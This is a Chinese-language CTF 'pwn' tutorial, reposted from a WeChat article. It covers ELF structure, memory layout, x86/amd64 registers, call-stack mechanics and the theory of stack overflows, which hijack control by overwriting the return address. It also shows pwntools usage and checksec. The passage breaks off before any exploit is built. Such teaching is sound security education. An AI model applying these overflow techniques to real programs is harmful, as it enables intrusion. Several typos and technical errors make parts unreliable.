> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dUBxlknyMVDP7E9GIEqlsg)

二进制漏洞挖掘与利用

### 二进制基础

#### 程序的编译与里连接

程序的编译与链接

从C源代码到执行文件的生成过程

*   编译
    

*   由C语言代码生成汇编代码
    

*   汇编
    

*   由汇编代码生成机器码
    

*   链接
    

*   将多个机器码的目标文件链接，成一个可执行问卷
    

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpZWxmicJjsxyJdh6JndKKSqfDw19XuM4kwJbiapyw2PaZ92S08FCZXUIA/640?wx_fmt=png)

一般来说的pwn的文件都是由c语言进行的编写

windows上的文件与linux上的文件类型有一个区别，若是在windows系统中，将本来的txt文件的后缀名改为zip后缀名，则会轻易的将这个文件的属性进行修改

但是若在linux系统中，将文件的后缀名进行修改后，使用`file`命令进行查看，文件的属性不会进行改变

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRplsvDTkDRejulJaJkj6VkU8bwiauicKgkqa68JlOXmB15LQF1PTXwDQ8Q/640?wx_fmt=png)

这个文件的属性是C的文件，文件在机器中的底端的编码是为ascii码

在vim文本编辑器中有一个功能可以在文本里面之间查看每个字符所对应的ascii码

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpp9kKS3gJ20LkYvvdRHf9jBMN4icX2zRg22fP19UsjmHicPqWps5rjqew/640?wx_fmt=png)

若是将这个文件进行了这个样子的保存，则可以再将这个文件恢复成原本的样子

再将这个文件进行查看，则就可以还原成原本的内容

在汇编的过程中重要的是`汇编`和`链接`

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpY4BAPAgROSVKD0Fmu5TPYxX4l9fA08wWd75EibKSmSlRbs5AsVdIwhQ/640?wx_fmt=png)

`gcc -S test.c` 使用gcc命令将`test.c`C文件编译为`test.s`汇编文件

再使用`gcc test.s` 来将C语言文件编译成可以执行文件`a.out`

然后查看执行文件，这时文件里存储的就是二进制的文件

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpx1smf34CxTIBJ9wcgAOjou9l8aXoHN2bOJg18iap2ibIFvkHcGcZlibzA/640?wx_fmt=png)

linux下的可执行文件格式ELF

什么是可执行文件

*   广义：文件中的数据是可执行代码的文件 `.out、.exe、.sh、.py`
    
*   狭义：文件中的数据是机器码的文件      `.out、.exe、.dll、.so`
    

广义的执行文件可以在文件内容中指定文件的解析的工具，也可以直接将这个文件使用工具进行解析

在文件中添加`#!/bin/python3`来定义这个文件的解释器

当这个文件中指定了解释器后，按理说是可以直接进行执行的，但是还要注意文件的权限问题

可执行文件的分类

*   windows: PE
    

*   可执行程序 `.exe`
    
*   动态链接库   `.dll`
    
*   静态链接库    `.lib`
    

*   Linux：ELF
    

*   可执行程序    `.out`
    
*   动态链接库    `.so`
    
*   静态链接库    `.a`
    

#### Linux下的可执行文件格式ELF

在这个simple.elf执行文件中有头部分、尾头部分、还有主体

头部分有分为`ELF文件头和程序头`，文件中有可显示内容和不可显示内容，而不可显示内容是用数字进行表示的

中间的主体有`代码和数据`

•ELF文件头表（ELF header）

•记录了ELF文件的组织结构（记录了整个elf文件的组织结构）

•程序头表/段表（Program header table）【有文件中的代码，而且是不可写，不可进行修改的】

•告诉系统如何创建进程

•生成进程的可执行文件必须拥有此结构

•重定位文件不一定需要

•节头表（Section header table）

•记录了ELF文件的节区信息（每一个ELF文件都有很多不同的代码块，在这个表中表示了每一个代码块的信息进行了记录）

•用于链接的目标文件必须拥有此结构

•其它类型目标文件不一定需要

磁盘中的ELF(可执行文件)与内存中的ELF(进程内存映像)

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRp00O5Gnchzu6FFjP11QRDsj3ldS4LhvybOaMiaVOV564rHI8IdaFlWEw/640?wx_fmt=png)

磁盘与内存的区分：

磁盘是使用`磁物质`来进行存储数据的，所以在电源断电的情况下，还是`可以`进行保存数据的

内存是通过`电`来进行存储数据的，所以在电源断电的情况下`不会`进行存储

将我们要执行这个程序时，磁盘中的可执行文件就会将这个文件里的内容载入到内存中

在磁盘中的文件是`节`来进行存储的，在内存中是以`段`来进行存储的

将磁盘中的ELF（可执行文件）存储到内存中的ELF（进程内存映像）

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpwN8mxSvxJmy4Y1tzY4X3HZtib0ltv4uG6oWIgQxcqcPhdRZdD81RibJw/640?wx_fmt=png)

将这个文件中的数据（数据段）保存到内存中的Data段中，这些数据是可读可写的

但是剩下的**代码和只读数据**（代码段）保存到内存中的`Code`中，这些内容的权限都是一样，可读可执行

内存中的`Stack`（栈）段是用来表示文件中使用函数的状态

`heap`段的作用，想要在文件中写一个大号内存，并且将这个文件中写入图片。而将执行这个文件后，磁盘载入到内存中`heap`段的工作流程是，将那个新的大号内存进行创建，所以这个大号内存的空间就是在heap段上面的空段进行割取的，接着就将那个写入的图片保存到`heap`段中

`share libraries`是共享段程序

`For Kernel`是操作系统的代码，再实际的应用当中操作系统的代码可以只保存一份，其他的程序可以共享这一份操作系统

并且下面的`Data、Code、Unused`这三个是静态的存储，上面的`heap`是动态存储

#### 进程虚拟地址空间

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpwKdym0p9y1l4SE5Waibm9Ex17icKpI1Q8VgqhKTHJlsHq92sZSKhts5w/640?wx_fmt=png)

进程`虚拟地址`空间：`虚拟内存`：若是计算机没有虚拟内存，则所有的数据都会保存到计算机的内存条中，并且是写在系统中的，若是被攻击者攻击，则很快的，这些信息都会被获取到，所以要有`虚拟内存`的存在，才能防止这样的现象发生

并且在进行查询数据时，我们只能查看到虚拟内存的地址，而拿不到系统内存的地址

每一个程序都有一个虚拟内存的空间

地址以字节编码(1byte = 8bits) 常以16进制表示(如0x3c = 0011 1100)

虚拟内存`用户空间`每个进程一份

虚拟内存`内核空间`所有进程共享一份

虚拟内存nmap段中的`动态链接库`仅在物理内存中装载一份

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpdeFsZedDfJiclicwicZ6p7knEOyWDlkibow7kibD88PmRzadRYwgUdU55vQ/640?wx_fmt=png)

上面的1GB是内核空间，下面的3GB是用户空间

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpvoEjpLtpfKiaEoXXNLyzehsDGvuZBibrQIPn5dIric7vhicJsamRoia2zAQ/640?wx_fmt=png)

段(segment)和节(section)

*   代码段(Text segment)包含了代码与只读数据
    

*   `.text节`       # 实行用户所定义的功能
    
*   .rodata节       # 只读数据
    
*   .hash节
    
*   .dynsym节
    
*   .dynstr节
    
*   `.plt节`       #解析动态函数的实际地址【这里的实际地址是保存在下面数据段中的`.got.plt节`】
    
*   .rel.got节
    

*   数据段(Data segment)包含了可读可写数据
    

*   .data节
    
*   .dynamic节
    
*   .got节
    
*   `.got.plt节`         #用来保存上面`.plt节`里代码解析到的实际地址
    
*   `.bss节`                 #保存没有初始化的变量
    
*   ...
    

*   栈段(Stack segment)
    

*   一个`段`包含多个`节`
    
*   段试图用于`进程`的`内存`区域的`rwx权限划分`
    
*   节视图用于`ELF文件` 编译链接时 与 在`磁盘`上存储时 的`文件结构`的组织
    

#### 程序数据是如何在内存中组织的

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpAfVEm8Bic7ytjBIPj1aXW6lIkeGHr2S9KWuUYdicGUYE6OGPQWJIJgCQ/640?wx_fmt=png)

C语言中的局部变量是存储在栈中的，也就是`Stack` #因为局部变量在利用完后就会被进行丢弃，而栈`Stack`是用来表示文件中使用函数的状态，所以当利用完丢弃后进行保存时，就会被保存在`Stack`这个上面

然后还有`x`和`y`这两个变量在内存中的组织

因为x和y是形参，所以就只进行调用一次，这个组织的方式在x32与x64中的方式是不一样的

32位中是将`x`和`y`放在栈中的，而64位是不放在虚拟内存中的

**大端序与小端序**

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpEUQhFYm4HNvOTyxzOBj4FbZ8k5lt47ymSIt5n1ggL4HCT54ra35jxg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpLHpduYGD3svbjfbTWezKZUb9FvUHCVVcJvfcNSeVqXiaQLReRmxjPOw/640?wx_fmt=png)

在知道内存中是如何进行存储数据的之后，再来看一下程序与电脑的硬件是怎样交互进行的

一个电脑若是想要运行，其实一个cpu和内存条就可以进行运行

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpNzpKNLs5hVNceTSvjfn9teYlvO6iaf6gTwH3LVt4H4DgIjkaFaQqbpg/640?wx_fmt=png)

address(地址总线)、Data(数据总线)、Instruction(指令总线)进行数据传递

address地址总线的作用是cpu要告诉内存，现在需要哪一块地址的内容，接着就通过这个数据总线把这个需要的地址送回cpu中

Instruction控制总线是传送指令的

内存条中的Code里面保存的实际代码数据，也就是图中绿色的那一部分

而在这同时cpu中是存在一个计算器PC寄存器的，这个寄存器的作用是存放当前执行指令的地址，也就相当于，指向了当前这个代码执行到了哪一个位置

其实PC这个寄存器是存在于cpu中的`Register`这个里面的

amd64寄存器结构:

•rax：8Bytes

•eax：4Bytes

•ax：2Bytes

•ah：1Bytes

•al：1Bytes

部分寄存器的功能:

•RIP #相当与上面所讲的PC

•存放当前执行的指令的地址

•**RSP**

**•存放当前栈帧的栈顶地址**

•RBP

•存放当前栈帧的栈底地址

•RAX

•通用寄存器。存放函数返回值

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpy9m9anIf2HxKIcnmnncZgE92bTX2kEQjXrnw6ZQibQ1QibcWR5mcaT4g/640?wx_fmt=png)

静态链接的程序执行过程

图上右边的两个词组表示的是user mode(用户程序，是用户自己编写的代码)、kernel mode(内核程序[漏洞]，是程序自带的代码）

首先是`$./binary`在使用这个的时候是先将保存在虚拟内存中那一部分拷贝一份，接着将那一份被拷贝的内存使用`fork()`这个来进行调用，调用完后，使用`execve()`是一个动态链接库的函数，这个函数的含义是向下面操作系统申请

下次需要将内核中管理的物理硬件用走一点点，将需要用到的物理硬件时的操作通过内核部分的一下4个步骤之后放在`_start`代码(汇编代码)中，再调用`main()`函数

动态链接的程序的执行过程

动态链接程序的执行过程与静态相比，就是多了要向其他动态链接库调取代码，所以多了`Id.so`、`__libc_start_main()`、`_init`

  

#### x86&amd64汇编简述

常用汇编指令：

> •MOV
> 
> •LEA
> 
> •ADD/SUB
> 
> •PUSH
> 
> •POP
> 
> •CMP
> 
> •JMP
> 
> •J[Condition]
> 
> •CALL
> 
> •LEAVE
> 
> •RET
> 
> •……

```
MOV  
MOV DEST,SRC ;把源操作数传送给目标  
- MOV EAX,1234H ;执行结果(EAX)=1234H  
- MOV EBX,EAX  
- MOV EAX,[00404011H] ;[]表示取地址内的值  
- MOV EAX,[ESI]
```

```
LEA  
LEA REG, SRC                    ; 把源操作数的有效地址送给指定的寄存器  
- LEA EBX, ASC                    ; 取 ASC 的地址存放至 EBX 寄存器中  
- LEA EAX, 6[ESI]                 ; 把 ESI+6 单元的32位地址送给 EAX
```

```
PUSH  
PUSH VALUE                 ; 把目标值压栈，同时SP指针-1字长  
- PUSH 1234H   
- PUSH EAX  
32位是4字节  
64位是8字节
```

```
POP  
POP DEST                     ; 将栈顶的值弹出至目的存储位置，同时SP指针+1字长  
- POP EAX
```

### 栈溢出基础

*   C语言函数调用栈
    
*   ret2text
    
*   ret2shellcode
    

#### C语言函数调用栈

栈的工作原理

栈是从高地址往低地址进行增长

*   函数调用栈是指程序运行时内存一段连续的区域
    
*   用来保存函数运行时的状态信息，包括函数参数与局部变量等
    
*   称之为“栈”是因为发生函数调用时，**调用函数(caller)**的状态被保存在栈内，**被调用函数(callee)的状态被压入调用栈的栈顶**
    
*   在函数调用结束时，栈顶的函数(callee)状态被弹出，栈顶恢复到调用函数(caller)的状态
    
*   函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大
    

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpBLQicGdicROaHaP4Jq7fKFCrh4sHbPUb8XNvyG27x7ZCzpsPlJosYOEw/640?wx_fmt=png)

栈帧结构概览(32位)

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpic4yNcRQw7aXiciccMCm4ANWOpfnAeOVibF1OqlrUFichuMliavSdiakg6PLg/640?wx_fmt=png)

栈帧是在虚拟内存中用户空间的最高地址

`return address`返回地址 `stack frame pointer`上一个栈帧栈顶的值(上一个栈帧edp寄存器的值)

`callee saved registers`子函数保存在寄存器

`local vartables`局部变量

%edp子函数所用到的参数是保存在父函数栈帧的末尾

图中 的`arguments`是子函数中的形参

父函数最末尾的字长保存了父函数自己栈顶的值，所以图中`stack trame pointer`是指向了`previous stack trame pointer`的

*   函数状态主要涉及三个寄存器——esp(栈顶)、ebp(栈底)、eip(当前函数执行的指令)
    
*   首先将被调用函数（callee）的参数`按照逆序依次压入栈内`。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。
    

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpY0QibQwiaEayJI9yHHUa0xdDQiabIF2x7TibjSGMVCnRnDfcJIViaFkSRcQ/640?wx_fmt=png)

**将被调用函数的参数压入栈内**

*   然后将调用函数(caller)进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数(caller)的eip(指令)信息得以保存
    

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpbiahSn2xIiaolaWf7kriafMCx7tv7x1dibPib4nMbYcHPKqy0NlBfh0nWhg/640?wx_fmt=png)

**将被调用函数的返回地址压入栈内**

所以下一条指令地址也就是被调用函数状态的返回地址，也就是图中的`Return Address`

*   再将当前的ebp寄存器的值(也就是调用函数的基地址)压入栈内，并将ebp寄存器的值更新为当前栈顶的地址。这样调用函数(caller)的ebp(基地址)信息得以保存。同时，ebp被更新为被调用函数(callee)的基地址
    

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpMAmb4pmnTWDtCk6w7j07S4Ojsmo0suFBq1GD3MpcDMYBIzs96d5b6A/640?wx_fmt=png)

**将调用函数的基地址（ebp)压入栈内，并将当前栈顶地址传到 ebp 寄存器内**

*   再之后是将被调用函数(callee)的局部变量等数据压入栈内
    

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpP2vA5Xt65sHPDmsF4qHhAq4NY9R4ULzE8AwxmYaUrSulKNV6ZibbPxw/640?wx_fmt=png)

**将被调用函数的局部变量压入栈内**

*   接着就是结束调用函数，变化的核心任务是丢弃被调用函数(callee)的状态，并将栈顶恢复为调用函数(caller)的状态
    
*   首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数的基地址
    

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRp8VCFUSY09fVgne2k6yImqxnIgq5oIPGBDL0lILhCvwicCzA71oKJhcQ/640?wx_fmt=png)

**将被调用函数的局部变量弹出栈外**

*   然后将及地址内存储的调用函数(caller)的基地址从栈内弹出，并存到edp寄存器内。这样调用函数(caller)的edp(基地址)信息得以恢复。此时栈顶会指向返回地址。
    

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpNra8XKhEkicQ2jwUjKfOUI1eZjmkaJCnNBY4y55Z0nsmbs1fSMUZbcg/640?wx_fmt=png)

**将调用函数（caller）的基地址（ebp）弹出栈外，并存到 ebp 寄存器内**

*   再将返回地址从栈内弹出，并存到eip寄存器内。这样调用函数(caller)的eip(指令)信息得以恢复。
    
*   至此调用函数(caller)的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。
    

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRp7Y7cGox8KN4ak4eHJTEjCHUO5zALkPrShjPaeJOAaqc5dwLLp5vT9Q/640?wx_fmt=png)

**将被调用函数的返回地址弹出栈外，并存到 eip 寄存器内**

函数调用栈的工作方式(cdecl)

这里的是原本的C语言代码

```
#include <studio.h>  
int callee(int a, int b, int c){  
    return a + b + c;  
}  
  
int caller(void){  
    int ret;  
    ret = callee(1, 2, 3);  
    ret += 4;  
    return ret;  
}
```

下面的是将C语言转换后的机器码

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpyZFSp5hzwv2JRA0j7BM00A2q4JpiauI6UXawlpvtLicjxCLves738Vibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpsc6JLLjYkkgNPychvXou9JhibxgWamuyFbPzib674fR5TWYibsRSzdN4A/640?wx_fmt=png)

*   X86
    

*   使用栈来传递参数
    
*   使用eax存放返回值
    

*   amd64
    

*   前6个参数一次存放于rdi、rsi、rdx、rcx、r8、r9寄存器中
    
*   第七个以后的参数存放于栈中
    

函数调用栈的工作方式(cdcal)`(x86)`

主调用函数也可能是另一个函数的被调用函数，所以在进行调用函数时，是将调用函数的父函数的栈底`ebp`进行压入，并且将`esp`压入到与`ebp`栈底相同的位置

首先第一步就是将父函数的edp(栈底)push出来

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRph0biacWY8RDumJnHP6XvRPicS4g0kclsNYeuU7ibm9hPZiakpeU8POy36w/640?wx_fmt=png)

接着就将esp(栈顶)的位置抬高到与ebp(栈底)的位置相同

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpJTeQXaxc2FonQBRMeT9VIcFUFC8DSThPhicicMbrPffibcIUehjBz2qPw/640?wx_fmt=png)

然后就是为被调用栈开辟新的局部变量的空间，有个小细节😁，为什么是减0x10呢，前面提到过很多次，栈中的存放顺序是逆序，向上进行增长的

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpUXeyDjqvJYIu1EdYd4wO2pwBQjTgiat8Ul6EkibMDmeZYRBXCXUfibRUQ/640?wx_fmt=png)

再往下看，1a所对应的值就开始调用子函数了，首先是将被调用函数中的三个参数放入了栈中，而且是逆序的进行插入的

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRp89gczkTUZQK9emczmWa3UUicjKMgWjlpZOngDddY01vE03WN8oEOqsA/640?wx_fmt=png)

因为上面我们C语言的源代码写的顺序是`callee(1, 2, 3)`，在栈中压入是3最先压入，2再进行压入，1是最后压入

  

然后就正式的开始进行调用函数，首先是使用了`call`这条指令，将`eip`当前函数执行的指令指向了被调用函数的`push %ebp`，并且`将调用函数的下一条指令当作是返回地址`压入栈中，随之，`esp`栈顶也就跟着指向了`返回地址`的地方

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpyqlAdlsiaA4C1dXlSUD5ZmYicFwX9kuuv8NdFZKvQIhNotic8Zd5knZNw/640?wx_fmt=png)

接着就像最开始一样，将父函数的`ebp`(栈底)进行保存，重新增加到了被调用函数的栈中。接着又执行了`mov %esp,%ebp`，也就是将esp的值传入到了ebp中，之后就是将`ebp`的值抬高到与`esp`相同的位置

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpia2LpqFNAv6WLjCz5WDAJ1yJE4hvWLIiaq6SZEyhYzbfibIqyibiaJY3HeA/640?wx_fmt=png)

接着就将父函数中传入子函数里的值进行运算，然后将运算结果保存在`%eax`中

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpMCIdvkDjEXicSVHhCNnT3BKickMtBqUnUYKzAmgh9vVeOtxy3MEFSWBA/640?wx_fmt=png)

接着就是`pop %ebp`，是因为在被调用的函数中没有`局部变量`，所以esp没有开辟对于局部变量的区域，然后将当前的`ebp`进行保存，调用函数(caller)的edp(基地址)信息得以恢复，再次指向原本调用函数的

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpGgEDZOoBG6U58xRmIOp2YSo0YNsj2GicmlzwoJLcRbice5NMw7KAeV2g/640?wx_fmt=png)

接着就将被调用函数的返回地址弹出栈中，然后`%esp`就会指向上一层，会将调用函数的返回地址在进行弹出，%eip就会返回到调用函数的下一步骤

接着就是继续执行调用函数的下一条指令，`add %0xc,%esp`，将被调用函数的相关数据进行清除，所以栈顶`esp`就会指向给调用函数开辟的空间的最后

再往后就是将被调用函数运算后的值保存在调用函数的`eax`当中![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpKAng6icCTqiaiaY8vAicTWgHCK7qU5JUIxGhBlgKWRHiaCbt9PeNR3EOgxA/640?wx_fmt=png)

清空在调用函数中为局部变量开辟的空间，并且将栈顶的指针指向与栈底的一样，也就是栈顶恢复回到栈底

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpnNREjbEAQ394Z8zuYqVbgfmMN7asWXSsaqNvrg6cZl2htdxHlu0yrQ/640?wx_fmt=png)

之后就和上面的`pop`一样，`esp`栈顶的指针就会向上再上升一个位置

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpxwPmibEjjdiaAvbugEgqibQxibxUp4oUyJfbKHRgJjuoof9cH5tAicMIhBw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpX7YC5R1VGguo7M3tQ72UAOyUqfhOQIMwqSCLqiarazFV2fnduHAic96Q/640?wx_fmt=png)

然后全部退出后，`%eip`结束工作，并且`esp`指针再往上移动

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpR0Izh8zZjzIricsR3iavqWypscdqXKBYaibrWH8xa6u4iaOQQ8BqgAeDWw/640?wx_fmt=png)

  

接下来就是把这样一个流程放到栈溢出的攻击中进行。回想刚才这一整个流程，我们想想当函数正在执行内部指令的过程中我们无法拿到程序的控制权`(shell)`，只有再发生函数调用，结束调用时或者是`%eip`写入数据时程序的控制全会在函数状态之间发生跳转，这是才可通过修改函数状态来实现攻击。而控制程序执行指令最关键的也就是刚刚又提及到的`%eip`寄存器，所以在栈溢出攻击时最核心的方法就是让`eip`载入攻击指令的地址

先想想在函数调用结束时，如果要让`eip`指向攻击指令，要准备什么。首先，在退栈过程中，返回地址`(return address)`会被传给`eip`，所以我们需要让溢出数据`用攻击指令的地址来覆盖原来的返回地址`。接着，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpSicLb0CqsM5WwsD4VHLGvFPDwibb6iaSWqq6oTrp9GlZSbJgH3BlPLbfQ/640?wx_fmt=png)

### 扩展：缓冲区溢出

现在所接触的`栈溢出`是`缓冲区溢出`里的一种

本质是向`定长的缓冲区`中写入了超长的数据，造成超出的数据覆写了合法内存区域

*   `栈溢出`(Stack overflow)
    

*   最常见、漏洞比例最高、危害醉倒的二进制漏洞
    
*   在(CTF PWN中往往是漏洞利用的基础)
    

*   栈溢出(Heap overflow)
    

*   现实中的漏洞占比不高
    
*   堆管理器复杂，利用花样繁多
    
*   CTF PWN中的常见题型
    

*   BSS溢出(BSS overflow)
    

*   现实中与CTF比赛中占比都不高
    
*   攻击效果依赖与BSS上存放了何种控制数据
    

*   Data段溢出
    

*   攻击效果依赖于 Data段 上存放了何种控制数据
    

栈溢出的大致实现方式

栈溢出

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpDmqtGhlP9VZZh3GMgl1n7NnPJJmYp7gynLrue3wlQ30CPibjBEm9KIw/640?wx_fmt=png)

因为设定的buf为[8]，8个字节，所以在开辟局部变量的空间时，就只有8个字节的地方，每4个为一组，当我们输入的数据远远大于8字节是，在数据压入栈时，多的数据就会逆序依次向上进行存放

  

实例1：

首先安装好`pwntools`和`pwndbg`

在ubuntu的系统中使用命令

> apt-get updateapt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essentialpython3 -m pip install --upgrade pippython3 -m pip install --upgrade pwntools #使用这个命令时，不要使用root用户

pwntools工具的使用

1.连接上我们需要进行分析的程序文件，一般使用本地连接，process("文件名")

2.进行连接后，在这之前就先看一下，这个文件在执行时所出现的效果

> python3
> 
> from pwn import *
> 
> io = process("./ret2text") #创建本地与本地文件的连接，`io`是我们定义的函数名
> 
> io = remote("localhost", 1234) #建立远程主机端口的连接

执行文件

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpt3fSpIOLFg6JDRCueJPv7sBkwb3eAOxT6NZHyA5ibnibQ2kra3daDiaTg/640?wx_fmt=png)

可以看到是先输出一句话来询问我们是否知道缓冲区溢出，然后就是需要我们进行回答

那在使用pwntools时，我们就来看看这句话的执行

> io.recvline() #输出程序执行后的一行内容
> 
> io.recv() #输出程序执行后的所有内容

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpMiaAmLZeZJNJpYa7xCfg9rDWPQYeYZNAWATS2zFgjpOfGc5oswZcBlw/640?wx_fmt=png)

因为上面有说到，这个程序在输出这句话后，就轮到我们进行输入内容，在pwntools工具中

> io.send("需要输入的内容")
> 
> io.sendline("需要输入的内容") #在输入的内容后添加一个换行符

在输入数据后，会再次向我们进行返回数据，使用`io.recv()`进行查看

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpjj79MCMSNLeicxpleiapibG5Ecb0fZGXkT7F1ZSzbFqVWeD6DEk2LCaNA/640?wx_fmt=png)

返回语句的意思是“看来你对此一无所知.......”

这里只是举一个题目来进行基础语法的介绍

  

实例2：tools

首先先看看执行文件后会出现什么

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpIpORm3uAyx9k43WcD84iaZ5vUNJYAbKZvBnPHQpTOW3qrWQQCwePalw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpuu0HjQicvu5tEfyyhcoAY69KQdANrrVHR2RwA87CCofQTic0wC5oibdEg/640?wx_fmt=png)

然后就先用pwntools工具连接，在连接后，首先想到的就是查看输出的数据

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpT1xIgdlprnpJsX21nRmElXZnw4j9ichVJZ0SAyqribiczR9oU3jn2FhCw/640?wx_fmt=png)

很明显一段数据一看就是base64的编码

> 解释：
> 
> 在base64那一段编码的后面有`\r`这样一个字符，是代表着将`\r`前面的字符进行删除，`\`结束删除
> 
> 在执行文件时，会将这一段删除的字符不显示出来，而`pwntools`工具中的`io.recv()`函数会将所有的字符都返回回来

接着就是去进行解码

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpRxnia6mSKDYkAeXibMAgicgC8OjcSwEwoxhAMTGKoQQfjAgdGy5Qf5LDA/640?wx_fmt=png)

flag就出来了

  

实例3：ret2text

pwndbg工具

像ctf的题目一样的步骤

首先使用`checksec`查看文件的各种信息

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRp6zeUaqDIehySiavK8wLIFuARbLzWVTk6ChXLDCy2xUia1j1GIAPYMBvw/640?wx_fmt=png)

`checksec`命令的使用

`Arch` 程序架构信息，判断是64位还是32位，exp编写的时候是p64还是p32

`RELRO` 这个技术主要针对GOT改写的攻击方式，分为两种`Partial RELRO(部分)`和`FULL RELRO(全部)`部分的技术更加容易受到攻击，而全部的技术会使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号

`Stack` 栈溢出

`NX` NX enable 这个保护开启表示栈中数据没有执行权限`PIE` PTE（Position-Independent Executable，位置无关可执行文件）技术，在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，传统改写GOT表项也难以进行，因为攻击者不能获得程序的.got段的虚地址。若开始一般需在攻击时歇够地址信息

  

所以在上面题目中的文件所显示的的文件详细信息就是32位小端序，并且部分开启了

接着就先来执行一下文件，看看会显示什么字符串来进行

可以看到首先是给我们输出了一句话，询问我们是否了解缓冲区溢出，然后然我们进行输入

首先使用工具IDA进行分析

知道文件是32位的

